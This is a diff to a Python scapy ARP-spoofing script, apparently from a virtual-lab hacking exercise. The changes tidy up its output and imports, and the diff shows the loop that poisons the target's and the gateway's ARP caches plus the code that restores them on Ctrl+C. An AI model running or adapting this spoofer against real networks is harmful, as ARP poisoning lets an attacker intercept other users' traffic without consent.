@@ -18,13 +18,15 @@
 
 #!/usr/bin/env python
 
-import scapy.all as scapy
+from __future__ import print_function
 import time
 import sys
 
+import scapy.all as scapy
+
 # ip and mac_address found with network_scanner.py
 target_ip = "10.0.2.5"
-mac_address = "08:00:27:08:72:ce"
+# mac_address = "08:00:27:08:72:ce"
 # target_ip = "10.0.2.1"
 # mac_address = "52:54:00:12:35:00"
 
@@ -64,9 +66,11 @@ try:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         sent_packets_count += 2
-        print("\r[+] Packets sent: " + str(sent_packets_count))
+        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+        sys.stdout.flush()
+        
         time.sleep(1)
 except KeyboardInterrupt:
-    print("[-] Detected ctrl + C ... Resetting ARP tables ... Please wait.\n")
+    print("\n[-] Detected ctrl + C ... Resetting ARP tables ... Please wait.\n")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
